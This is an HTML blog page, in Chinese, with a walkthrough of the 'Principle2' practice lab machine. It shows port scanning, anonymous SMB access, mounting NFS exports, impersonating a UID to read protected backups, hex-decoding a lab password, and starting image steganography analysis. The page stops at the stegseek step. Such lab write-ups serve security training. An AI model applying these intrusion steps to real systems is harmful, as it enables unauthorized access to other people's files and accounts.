@@ -1,0 +1,983 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/175701418?v=4"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# 0.简介
+
+**靶机**：[thehackerslabs - Principle2](https://hackmyvm.eu/machines/machine.php?vm=Principle2)
+**难度**：黄色
+**目标 IP**：192.168.205.247
+**本机 IP**：192.168.205.141
+
+---
+
+# 1.扫描
+
+`nmap`起手
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sT --min-rate 10000 -p- -Pn 192.168.205.247
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-12 10:45 CST
+Nmap scan report for thetruthoftalos.hmv (192.168.205.247)
+Host is up (0.00075s latency).
+Not shown: 63482 closed tcp ports (conn-refused), 2043 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+80/tcp    open  http
+111/tcp   open  rpcbind
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+2049/tcp  open  nfs
+35659/tcp open  unknown
+42607/tcp open  unknown
+43239/tcp open  unknown
+43401/tcp open  unknown
+46365/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
+                                                                   
+```
+
+其中80，111，139，445，2049端口我们比较感兴趣，但是我先看smb服务，因为我怕他整幺蛾子
+
+---
+
+# 2.踩点
+
+## prot 445
+
+ps:它这个smb服务不知道是它靶机有幺蛾子还是我攻击机有幺蛾子，我用不了smbmap，而且我用smbclient访问目录有概率失败，如果你复现失败的话，多试几次
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ smbclient //192.168.205.247/public
+Password for [WORKGROUP\kali]:
+Try 'help' to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Tue Nov 28 19:57:45 2023
+  ..                                  D        0  Sun Nov 26 00:19:40 2023
+  new_era.txt                         N      158  Sun Nov 19 20:01:00 2023
+  straton.txt                         N      718  Sun Nov 19 20:00:24 2023
+  loyalty.txt                         N      931  Sun Nov 19 20:01:07 2023
+
+                19962704 blocks of size 1024. 17182940 blocks available
+smb: \> get new_era.txt
+getting file \new_era.txt of size 158 as new_era.txt (77.1 KiloBytes/sec) (average 77.1 KiloBytes/sec)
+smb: \> get straton.txt
+getting file \straton.txt of size 718 as straton.txt (350.6 KiloBytes/sec) (average 213.9 KiloBytes/sec)
+smb: \> get loyalty.txt
+getting file \loyalty.txt of size 931 as loyalty.txt (454.6 KiloBytes/sec) (average 294.1 KiloBytes/sec)
+smb: \> exit
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat new_era.txt                   
+Yesterday there was a big change, new government, new mayor. All citizens were reassigned their tasks. For security, every user should change their password.
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat straton.txt
+This fragment from Straton's On the Universe appears to have been of great significance both to the Progenitor and to the Founder.
+
+AMYNTAS:        But what does this tell us about the nature of the universe, which is what we were discussing?
+STRATON:        That is the next question we must undertake to answer. We begin with the self because that is what determines our existence as individuals; but the self cannot exist without that which surrounds it. The citizen lives within the city; and the city lives within the cosmos. So now we must apply the principle we have discovered to the wider world, and ask: if man is like a machine, could it be that the universe is similar in nature? And if so, what follows from that fact?
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat loyalty.txt
+This text was the source of considerable controversy in a debate between Byron (7) and Hermanubis (452).
+
+What I propose, then, is that we are not born as entirely free agents, responsible only for ourselves. The very core of what we are, our sentience, separates us from and elevates us above the animal kingdom. As I have argued, this is not a matter of arrogance, but of responsibility.
+
+2257686f2061726520796f752c207468656e3f22
+
+To put it simply: each of us owes a burden of loyalty to humanity itself, to the human project across time and space. This is not a minor matter, or some abstract issue for philosophers. It is a profound and significant part of every human life. It is a universal source of meaning and insight that can bind us together and set us on a path for a brighter future; and it is also a division, a line that must held against those who preach the gospel of self-annihilation. We ignore it at our peril.
+                                                                                                                                     
+
+# new_era.txt翻译
+昨天发生了重大变化，新政府，新市长。">
+<meta property="og:title" content="hmv_Principle2">
+<meta property="og:description" content="# 0.简介
+
+**靶机**：[thehackerslabs - Principle2](https://hackmyvm.eu/machines/machine.php?vm=Principle2)
+**难度**：黄色
+**目标 IP**：192.168.205.247
+**本机 IP**：192.168.205.141
+
+---
+
+# 1.扫描
+
+`nmap`起手
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sT --min-rate 10000 -p- -Pn 192.168.205.247
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-12 10:45 CST
+Nmap scan report for thetruthoftalos.hmv (192.168.205.247)
+Host is up (0.00075s latency).
+Not shown: 63482 closed tcp ports (conn-refused), 2043 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+80/tcp    open  http
+111/tcp   open  rpcbind
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+2049/tcp  open  nfs
+35659/tcp open  unknown
+42607/tcp open  unknown
+43239/tcp open  unknown
+43401/tcp open  unknown
+46365/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
+                                                                   
+```
+
+其中80，111，139，445，2049端口我们比较感兴趣，但是我先看smb服务，因为我怕他整幺蛾子
+
+---
+
+# 2.踩点
+
+## prot 445
+
+ps:它这个smb服务不知道是它靶机有幺蛾子还是我攻击机有幺蛾子，我用不了smbmap，而且我用smbclient访问目录有概率失败，如果你复现失败的话，多试几次
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ smbclient //192.168.205.247/public
+Password for [WORKGROUP\kali]:
+Try 'help' to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Tue Nov 28 19:57:45 2023
+  ..                                  D        0  Sun Nov 26 00:19:40 2023
+  new_era.txt                         N      158  Sun Nov 19 20:01:00 2023
+  straton.txt                         N      718  Sun Nov 19 20:00:24 2023
+  loyalty.txt                         N      931  Sun Nov 19 20:01:07 2023
+
+                19962704 blocks of size 1024. 17182940 blocks available
+smb: \> get new_era.txt
+getting file \new_era.txt of size 158 as new_era.txt (77.1 KiloBytes/sec) (average 77.1 KiloBytes/sec)
+smb: \> get straton.txt
+getting file \straton.txt of size 718 as straton.txt (350.6 KiloBytes/sec) (average 213.9 KiloBytes/sec)
+smb: \> get loyalty.txt
+getting file \loyalty.txt of size 931 as loyalty.txt (454.6 KiloBytes/sec) (average 294.1 KiloBytes/sec)
+smb: \> exit
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat new_era.txt                   
+Yesterday there was a big change, new government, new mayor. All citizens were reassigned their tasks. For security, every user should change their password.
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat straton.txt
+This fragment from Straton's On the Universe appears to have been of great significance both to the Progenitor and to the Founder.
+
+AMYNTAS:        But what does this tell us about the nature of the universe, which is what we were discussing?
+STRATON:        That is the next question we must undertake to answer. We begin with the self because that is what determines our existence as individuals; but the self cannot exist without that which surrounds it. The citizen lives within the city; and the city lives within the cosmos. So now we must apply the principle we have discovered to the wider world, and ask: if man is like a machine, could it be that the universe is similar in nature? And if so, what follows from that fact?
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat loyalty.txt
+This text was the source of considerable controversy in a debate between Byron (7) and Hermanubis (452).
+
+What I propose, then, is that we are not born as entirely free agents, responsible only for ourselves. The very core of what we are, our sentience, separates us from and elevates us above the animal kingdom. As I have argued, this is not a matter of arrogance, but of responsibility.
+
+2257686f2061726520796f752c207468656e3f22
+
+To put it simply: each of us owes a burden of loyalty to humanity itself, to the human project across time and space. This is not a minor matter, or some abstract issue for philosophers. It is a profound and significant part of every human life. It is a universal source of meaning and insight that can bind us together and set us on a path for a brighter future; and it is also a division, a line that must held against those who preach the gospel of self-annihilation. We ignore it at our peril.
+                                                                                                                                     
+
+# new_era.txt翻译
+昨天发生了重大变化，新政府，新市长。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPH.github.io/post/hmv_Principle2.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/175701418?v=4">
+<title>hmv_Principle2</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">hmv_Principle2</h1>
+<div class="title-right">
+    <a href="https://7r1UMPH.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPH/7r1UMPH.github.io/issues/16" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>0.简介</h1>
+<p><strong>靶机</strong>：<a href="https://hackmyvm.eu/machines/machine.php?vm=Principle2" rel="nofollow">thehackerslabs - Principle2</a><br>
+<strong>难度</strong>：黄色<br>
+<strong>目标 IP</strong>：192.168.205.247<br>
+<strong>本机 IP</strong>：192.168.205.141</p>
+<hr>
+<h1>1.扫描</h1>
+<p><code class="notranslate">nmap</code>起手</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nmap -sT --min-rate 10000 -p- -Pn 192.168.205.247
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-12 10:45 CST
+Nmap scan report <span class="pl-k">for</span> thetruthoftalos.hmv (192.168.205.247)
+Host is up (0.00075s latency).
+Not shown: 63482 closed tcp ports (conn-refused), 2043 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+80/tcp    open  http
+111/tcp   open  rpcbind
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+2049/tcp  open  nfs
+35659/tcp open  unknown
+42607/tcp open  unknown
+43239/tcp open  unknown
+43401/tcp open  unknown
+46365/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 2.07 seconds
+                                                                   </pre></div>
+<p>其中80，111，139，445，2049端口我们比较感兴趣，但是我先看smb服务，因为我怕他整幺蛾子</p>
+<hr>
+<h1>2.踩点</h1>
+<h2>prot 445</h2>
+<p>ps:它这个smb服务不知道是它靶机有幺蛾子还是我攻击机有幺蛾子，我用不了smbmap，而且我用smbclient访问目录有概率失败，如果你复现失败的话，多试几次</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ smbclient //192.168.205.247/public
+Password <span class="pl-k">for</span> [WORKGROUP<span class="pl-cce">\k</span>ali]:
+Try <span class="pl-s"><span class="pl-pds">"</span>help<span class="pl-pds">"</span></span> to get a list of possible commands.
+smb: <span class="pl-cce">\&gt;</span> ls
+  <span class="pl-c1">.</span>                                   D        0  Tue Nov 28 19:57:45 2023
+  ..                                  D        0  Sun Nov 26 00:19:40 2023
+  new_era.txt                         N      158  Sun Nov 19 20:01:00 2023
+  straton.txt                         N      718  Sun Nov 19 20:00:24 2023
+  loyalty.txt                         N      931  Sun Nov 19 20:01:07 2023
+
+                19962704 blocks of size 1024. 17182940 blocks available
+smb: <span class="pl-cce">\&gt;</span> get new_era.txt
+getting file <span class="pl-cce">\n</span>ew_era.txt of size 158 as new_era.txt (77.1 KiloBytes/sec) (average 77.1 KiloBytes/sec)
+smb: <span class="pl-cce">\&gt;</span> get straton.txt
+getting file <span class="pl-cce">\s</span>traton.txt of size 718 as straton.txt (350.6 KiloBytes/sec) (average 213.9 KiloBytes/sec)
+smb: <span class="pl-cce">\&gt;</span> get loyalty.txt
+getting file <span class="pl-cce">\l</span>oyalty.txt of size 931 as loyalty.txt (454.6 KiloBytes/sec) (average 294.1 KiloBytes/sec)
+smb: <span class="pl-cce">\&gt;</span> <span class="pl-c1">exit</span>
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat new_era.txt                   
+Yesterday there was a big change, new government, new mayor. All citizens were reassigned their tasks. For security, every user should change their password.
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat straton.txt
+This fragment from Straton<span class="pl-s"><span class="pl-pds">'</span>s On the Universe appears to have been of great significance both to the Progenitor and to the Founder.</span>
+<span class="pl-s"></span>
+<span class="pl-s">AMYNTAS:        But what does this tell us about the nature of the universe, which is what we were discussing?</span>
+<span class="pl-s">STRATON:        That is the next question we must undertake to answer. We begin with the self because that is what determines our existence as individuals; but the self cannot exist without that which surrounds it. The citizen lives within the city; and the city lives within the cosmos. So now we must apply the principle we have discovered to the wider world, and ask: if man is like a machine, could it be that the universe is similar in nature? And if so, what follows from that fact?</span>
+<span class="pl-s">                                                                                                                                     </span>
+<span class="pl-s">┌──(kali㉿kali)-[~/test]</span>
+<span class="pl-s">└─$ cat loyalty.txt</span>
+<span class="pl-s">This text was the source of considerable controversy in a debate between Byron (7) and Hermanubis (452).</span>
+<span class="pl-s"></span>
+<span class="pl-s">What I propose, then, is that we are not born as entirely free agents, responsible only for ourselves. The very core of what we are, our sentience, separates us from and elevates us above the animal kingdom. As I have argued, this is not a matter of arrogance, but of responsibility.</span>
+<span class="pl-s"></span>
+<span class="pl-s">2257686f2061726520796f752c207468656e3f22</span>
+<span class="pl-s"></span>
+<span class="pl-s">To put it simply: each of us owes a burden of loyalty to humanity itself, to the human project across time and space. This is not a minor matter, or some abstract issue for philosophers. It is a profound and significant part of every human life. It is a universal source of meaning and insight that can bind us together and set us on a path for a brighter future; and it is also a division, a line that must held against those who preach the gospel of self-annihilation. We ignore it at our peril.</span>
+<span class="pl-s">                                                                                                                                     </span>
+<span class="pl-s"></span>
+<span class="pl-s"># new_era.txt翻译</span>
+<span class="pl-s">昨天发生了重大变化，新政府，新市长。所有公民都重新分配了任务。为了安全起见，每个用户都应该更改密码。</span>
+<span class="pl-s"></span>
+<span class="pl-s"># straton.txt翻译</span>
+<span class="pl-s">斯特拉顿的《论宇宙》中的这段片段似乎对祖先和创始人都具有重大意义。</span>
+<span class="pl-s"></span>
+<span class="pl-s">阿米塔斯：但是，这告诉我们有关宇宙本质的什么，也就是我们正在讨论的？</span>
+<span class="pl-s">斯特拉顿：这是我们必须回答的下一个问题。我们从自我开始，因为自我决定了我们作为个体的存在；但是，如果没有周围的事物，自我就无法存在。公民生活在城市中；城市生活在宇宙中。所以现在我们必须将我们发现的原理应用到更广阔的世界，并问：如果人就像一台机器，那么宇宙的本质是否也类似？如果是这样，从这个事实中可以得出什么结论？</span>
+<span class="pl-s"></span>
+<span class="pl-s"># loyalty.txt翻译</span>
+<span class="pl-s">这段文字在拜伦 (7) 和赫尔曼努比斯 (452) 的辩论中引起了相当大的争议。</span>
+<span class="pl-s"></span>
+<span class="pl-s">因此，我认为，我们并非生来就是完全自由的个体，只对自己负责。我们存在的核心，我们的知觉，将我们与动物王国区分开来，并使我们高于动物王国。正如我所说，这不是傲慢的问题，而是责任的问题。</span>
+<span class="pl-s"></span>
+<span class="pl-s">2257686f2061726520796f752c207468656e3f22</span>
+<span class="pl-s"></span>
+<span class="pl-s">简而言之：我们每个人都对人类本身、对跨越时空的人类项目负有忠诚的义务。这不是一件小事，也不是哲学家的抽象问题。它是每个人生命中深刻而重要的一部分。它是意义和洞察力的普遍源泉，可以将我们团结在一起，为我们铺平通往更光明未来的道路；这也是一条分界线，一条必须与那些宣扬自我毁灭福音的人划清的界线。我们忽视它，后果自负。</span></pre></div>
+<p>其中密码为<strong>空。</strong> 我们比较感兴趣的是那串像密码一样的字符串。smb服务就可以告一段落了</p>
+<hr>
+<h2>prot 80</h2>
+<p>80端口是Apache2的初始页，并且它大小为常规大小<code class="notranslate">10701</code>，那我们爆破目录</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ gobuster dir -u http://192.168.205.247 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -b 404 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) <span class="pl-k">&amp;</span> Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.205.247
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,html,txt,md
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster <span class="pl-k">in</span> directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 10701]
+Progress: 110804 / 311425 (35.58%)[ERROR] parse <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.247/besalu\t.php<span class="pl-pds">"</span></span>: net/url: invalid control character <span class="pl-k">in</span> URL
+[ERROR] parse <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.247/besalu\t.html<span class="pl-pds">"</span></span>: net/url: invalid control character <span class="pl-k">in</span> URL
+[ERROR] parse <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.247/besalu\t.txt<span class="pl-pds">"</span></span>: net/url: invalid control character <span class="pl-k">in</span> URL
+[ERROR] parse <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.247/besalu\t.md<span class="pl-pds">"</span></span>: net/url: invalid control character <span class="pl-k">in</span> URL
+/index.html           (Status: 200) [Size: 10701]
+Progress: 311420 / 311425 (100.00%)
+===============================================================
+Finished
+===============================================================
+                                                                            </pre></div>
+<p>无果，告一段落</p>
+<hr>
+<h2>prot 111</h2>
+<p>因为我没有打过这个服务，我就去<a href="https://book.hacktricks.wiki/" rel="nofollow">hacktricks</a>搜索了一下</p>
+<p><strong>资料</strong>：<a href="https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-rpcbind.html#bypass-filtered-portmapper-port" rel="nofollow">https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-rpcbind.html#bypass-filtered-portmapper-port</a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ceb202ec-7121-4628-8b32-5830b2dd5f65"><img src="https://github.com/user-attachments/assets/ceb202ec-7121-4628-8b32-5830b2dd5f65" alt="image" style="max-width: 100%;"></a></p>
+<p>阅读文本，我们可以发现它和NFS衔接，我们刚好有NFS</p>
+<p><strong>资料</strong>：<a href="https://book.hacktricks.wiki/zh/network-services-pentesting/nfs-service-pentesting.html" rel="nofollow">https://book.hacktricks.wiki/zh/network-services-pentesting/nfs-service-pentesting.html</a></p>
+<h3>查看挂载</h3>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ showmount -e 192.168.205.247
+Export list <span class="pl-k">for</span> 192.168.205.247:
+/var/backups <span class="pl-k">*</span>
+/home/byron  <span class="pl-k">*</span>
+                     </pre></div>
+<p>ps:<em>挂载记得要用sudo，不然它会报错</em></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ sudo mount -t nfs 192.168.205.247:/var/backups /home/kali/test/tmp/backup
+[sudo] kali 的密码：
+                                                                                                                                                                                                                                                          
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ <span class="pl-c1">cd</span> backup 
+cd: 权限不够: backup
+             
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ sudo mount -t nfs 192.168.205.247:/home/byron /home/kali/test/tmp/home
+
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ <span class="pl-c1">cd</span> home
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home]
+└─$ ls
+mayor.txt  memory.txt
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home]
+└─$ cat mayor.txt 
+Now that I am mayor, I think Hermanubis is conspiring against me, I guess he has a secret group and is hiding it.
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home]
+└─$ cat memory.txt
+Hermanubis told me that he lost his password and couldn<span class="pl-s"><span class="pl-pds">'</span>t change it, thank goodness I keep a record of each neighbor with their number and password in hexadecimal. I think he would be a good mayor of the New Jerusalem.</span>
+<span class="pl-s">                                        </span>
+<span class="pl-s"># mayor.txt翻译</span>
+<span class="pl-s">现在我已经是市长了，我觉得赫曼努比斯正在密谋反对我，我猜他有一个秘密组织并且把它隐藏起来。</span>
+<span class="pl-s"></span>
+<span class="pl-s"># memory.txt翻译     </span>
+<span class="pl-s">赫曼努比斯告诉我，他忘记了密码，无法更改，谢天谢地，我保存了每个邻居的号码和十六进制密码记录。我认为他会成为新耶路撒冷的好市长。                                                </span></pre></div>
+<p>告诉我们他保存了每个邻居的号码和十六进制密码记录，应该就在我们看不了那个文件夹，我们去查看一下它的权限</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
+└─$ ls -la
+总计 52
+drwxrwxr-x  4 kali kali    4096  1月12日 10:26 <span class="pl-c1">.</span>
+drwxrwxr-x 31 kali kali   12288  1月12日 10:03 ..
+drwxr--r--  2   54 backup 28672 2023年11月29日 backup
+drwxr-xr-x  3 1001   1001  4096 2023年11月26日 home
+</pre></div>
+<p>创建具有相同 UID 的用户进行访问：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
+└─$ sudo useradd -u 54 hack
+useradd warning: hack<span class="pl-s"><span class="pl-pds">'</span>s uid 54 outside of the UID_MIN 1000 and UID_MAX 60000 range.</span>
+<span class="pl-s">                                  </span>
+<span class="pl-s">┌──(kali㉿kali)-[~/test/tmp]</span>
+<span class="pl-s">└─$ su hack           </span>
+<span class="pl-s">密码： </span>
+<span class="pl-s">$ bash</span>
+<span class="pl-s">hack@kali:/home/kali/test/tmp$ cd backup/</span>
+<span class="pl-s">hack@kali:/home/kali/test/tmp/backup$ ls</span>
+<span class="pl-s">(这里省略)</span>
+<span class="pl-s"></span>
+<span class="pl-s">hack@kali:/home/kali/test/tmp/backup$ cat *.txt</span>
+<span class="pl-s">(这里省略)</span>
+<span class="pl-s"></span></pre></div>
+<p>我们将十六进制尝试恢复一下</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">hack@kali:/home/kali/test/tmp/backup$ cat <span class="pl-k">*</span>.txt <span class="pl-k">&gt;</span> /tmp/a.txt
+hack@kali:/home/kali/test/tmp/backup$ su kali
+密码： 
+
+┌──(kali㉿kali)-[~/test/tmp/backup]
+└─$ cp /tmp/a.txt <span class="pl-k">~</span>/test/a.txt
+                              
+┌──(kali㉿kali)-[~/test]
+└─$ xxd -ps -r a.txt <span class="pl-k">|</span> strings
+(这里省略)
+ByronIsAsshole
+(这里省略)                </pre></div>
+<p>获得了一个类似密码的东西，它没有开放ssh端口，那就只可能是smb服务的密码了</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ smbclient -L //192.168.205.247// -N                       
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        public          Disk      New Jerusalem Public
+        hermanubis      Disk      Hermanubis share
+        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
+Reconnecting with SMB1 <span class="pl-k">for</span> workgroup listing.
+smbXcli_negprot_smb1_done: No compatible protocol selected by server.
+Protocol negotiation to server 192.168.205.247 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
+Unable to connect with SMB1 -- no workgroup available
+                                                                                                                                                                                                                              
+┌──(kali㉿kali)-[~/test]
+└─$ smbclient //192.168.205.247/hermanubis -U hermanubis
+Password <span class="pl-k">for</span> [WORKGROUP<span class="pl-cce">\h</span>ermanubis]:
+Try <span class="pl-s"><span class="pl-pds">"</span>help<span class="pl-pds">"</span></span> to get a list of possible commands.
+smb: <span class="pl-cce">\&gt;</span> ls
+  <span class="pl-c1">.</span>                                   D        0  Tue Nov 28 22:44:44 2023
+  ..                                  D        0  Wed Nov 29 09:13:50 2023
+  index.html                          N      346  Tue Nov 28 22:44:41 2023
+  prometheus.jpg                      N   307344  Wed Nov 29 01:23:24 2023
+
+                19962704 blocks of size 1024. 17151324 blocks available
+smb: <span class="pl-cce">\&gt;</span> get index.html 
+getting file <span class="pl-cce">\i</span>ndex.html of size 346 as index.html (15.4 KiloBytes/sec) (average 15.4 KiloBytes/sec)
+smb: <span class="pl-cce">\&gt;</span> get prometheus.jpg 
+getting file <span class="pl-cce">\p</span>rometheus.jpg of size 307344 as prometheus.jpg (11543.8 KiloBytes/sec) (average 6260.0 KiloBytes/sec)
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat index.html 
+<span class="pl-k">&lt;</span><span class="pl-k">!</span>DOCTYPE html<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>html lang=<span class="pl-s"><span class="pl-pds">"</span>es<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>head<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>meta charset=<span class="pl-s"><span class="pl-pds">"</span>UTF-8<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>meta name=<span class="pl-s"><span class="pl-pds">"</span>viewport<span class="pl-pds">"</span></span> content=<span class="pl-s"><span class="pl-pds">"</span>width=device-width, initial-scale=1.0<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>title<span class="pl-k">&gt;</span>Welcome to the resistance forum<span class="pl-k">&lt;</span>/title<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/head<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>body<span class="pl-k">&gt;</span>
+
+    <span class="pl-k">&lt;</span>h<span class="pl-k">1&gt;</span>Welcome to the resistance forum<span class="pl-k">&lt;</span>/h<span class="pl-k">1&gt;</span>
+
+    <span class="pl-k">&lt;</span>p<span class="pl-k">&gt;</span>free our chains<span class="pl-k">!</span><span class="pl-k">&lt;</span>/p<span class="pl-k">&gt;</span>
+
+    <span class="pl-k">&lt;</span>img src=<span class="pl-s"><span class="pl-pds">"</span>prometheus.jpg<span class="pl-pds">"</span></span> alt=<span class="pl-s"><span class="pl-pds">"</span>chained<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+
+<span class="pl-k">&lt;</span>/body<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/html<span class="pl-k">&gt;</span>
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ exiftool prometheus.jpg   
+ExifTool Version Number         <span class="pl-c1">:</span> 13.00
+File Name                       <span class="pl-c1">:</span> prometheus.jpg
+Directory                       <span class="pl-c1">:</span> <span class="pl-c1">.</span>
+File Size                       <span class="pl-c1">:</span> 307 kB
+File Modification Date/Time     <span class="pl-c1">:</span> 2025:01:12 12:33:09+08:00
+File Access Date/Time           <span class="pl-c1">:</span> 2025:01:12 12:33:09+08:00
+File Inode Change Date/Time     <span class="pl-c1">:</span> 2025:01:12 12:33:09+08:00
+File Permissions                <span class="pl-c1">:</span> -rw-r--r--
+File Type                       <span class="pl-c1">:</span> JPEG
+File Type Extension             <span class="pl-c1">:</span> jpg
+MIME Type                       <span class="pl-c1">:</span> image/jpeg
+JFIF Version                    <span class="pl-c1">:</span> 1.01
+Resolution Unit                 <span class="pl-c1">:</span> None
+X Resolution                    <span class="pl-c1">:</span> 1
+Y Resolution                    <span class="pl-c1">:</span> 1
+Image Width                     <span class="pl-c1">:</span> 1920
+Image Height                    <span class="pl-c1">:</span> 1080
+Encoding Process                <span class="pl-c1">:</span> Baseline DCT, Huffman coding
+Bits Per Sample                 <span class="pl-c1">:</span> 8
+Color Components                <span class="pl-c1">:</span> 3
+Y Cb Cr Sub Sampling            <span class="pl-c1">:</span> YCbCr4:4:4 (1 1)
+Image Size                      <span class="pl-c1">:</span> 1920x1080
+Megapixels                      <span class="pl-c1">:</span> 2.1
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ stegseek prometheus.jpg 
